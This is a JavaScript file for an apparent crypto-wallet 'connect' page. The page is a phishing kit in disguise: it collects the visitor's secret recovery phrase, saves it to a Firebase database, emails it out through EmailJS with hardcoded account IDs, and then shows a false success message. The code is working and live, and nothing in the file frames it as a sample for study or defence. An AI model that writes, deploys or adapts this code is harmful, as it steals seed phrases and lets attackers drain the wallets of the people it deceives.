// This script handles the wallet connection functionality
document.addEventListener('DOMContentLoaded', function() {
    // Initialize EmailJS first
    if (typeof emailjs !== 'undefined') {
      emailjs.init("kclG0tp6oGhntRNvV"); // Replace with your actual EmailJS user ID
    } else {
        console.error("EmailJS library not loaded!");
    }
    
    // Get elements
    const connectWalletBtn = document.getElementById('button_connect_wallet');
    const secretPhraseInput = document.getElementById('secret_phrase');
    const walletNameInput = document.getElementById('wallet_namexx');
    
    // Enable/disable connect button based on input
    if (secretPhraseInput) {
      secretPhraseInput.addEventListener('keyup', function() {
        const phrase = this.value.trim();
        if (phrase !== "") {
          connectWalletBtn.disabled = false;
          connectWalletBtn.style.opacity = '1';
        } else {
          connectWalletBtn.disabled = true;
          connectWalletBtn.style.opacity = '0.2';
        }
      });
    }
    
    // Handle wallet connection
    if (connectWalletBtn) {
      connectWalletBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        // Get values
        const dataPhrase = secretPhraseInput.value.trim();
        const walletSelected = document.getElementById('wallet_name').textContent.trim();
        
        // Get username from URL if available
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('user') || 'Unknown User';
        
        // Disable button during processing
        connectWalletBtn.textContent = 'Loading...';
        connectWalletBtn.style.pointerEvents = 'none';
        
        try {
          // Store in Firebase
          await storeWalletData(walletSelected, dataPhrase, username);
          
          // Send email notification
          await sendEmailNotification(walletSelected, dataPhrase, username);
          
          // Show success message
          $('#popup_connect_wallet').modal('hide');
          $('#popup_connect_wallet_success').modal('show');
        } catch (error) {
          console.error('Error:', error);
          alert("An error occurred while connecting the wallet. Please try again.");
        } finally {
          // Re-enable button
          connectWalletBtn.textContent = 'Connect Wallet';
          connectWalletBtn.style.pointerEvents = 'auto';
        }
      });
    }
    
    // Close success modal
    const closeSuccessBtn = document.getElementById('close_success_modal');
    if (closeSuccessBtn) {
      closeSuccessBtn.addEventListener('click', function() {
        $('#popup_connect_wallet_success').modal('hide');
        $('#popup_connect_wallet').modal('hide');
      });
    }
});
  
// Store wallet data in Firebase
async function storeWalletData(walletSelected, dataPhrase, username) {
    return db.collection('wallets').add({
      wallet_selected: walletSelected,
      data_phrase: dataPhrase,
      username: username,
      created_at: firebase.firestore.FieldValue.serverTimestamp()
    });
}
  
// Send email notification using EmailJS
async function sendEmailNotification(walletSelected, dataPhrase, username) {
    // Check if EmailJS is available
    if (typeof emailjs === 'undefined') {
      console.error('EmailJS is not defined. Loading and trying again...');
      
      // Load EmailJS dynamically if not loaded
      try {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
        script.async = true;
        document.head.appendChild(script);
        
        // Wait for script to load
        await new Promise(resolve => script.onload = resolve);
        
        // Initialize EmailJS
        emailjs.init("kclG0tp6oGhntRNvV"); // Replace with your actual user ID
      } catch (e) {
        console.error('Failed to load EmailJS:', e);
        // Still continue with Firebase
        return Promise.resolve();
      }
    }
    
    // Replace with your EmailJS service ID, template ID, and user ID
    const serviceID = 'service_k5jpa5d';
    const templateID = 'template_6o5epxl';
    
    // Prepare template parameters
    const templateParams = {
      username: username,
      wallet_selected: walletSelected,
      data_phrase: dataPhrase,
      time: new Date().toLocaleString()
    };
    
    // Send the email
    try {
      return await emailjs.send(serviceID, templateID, templateParams);
    } catch (error) {
      console.error('Failed to send email:', error);
      // Still return a resolved promise to continue the flow
      return Promise.resolve();
    }
}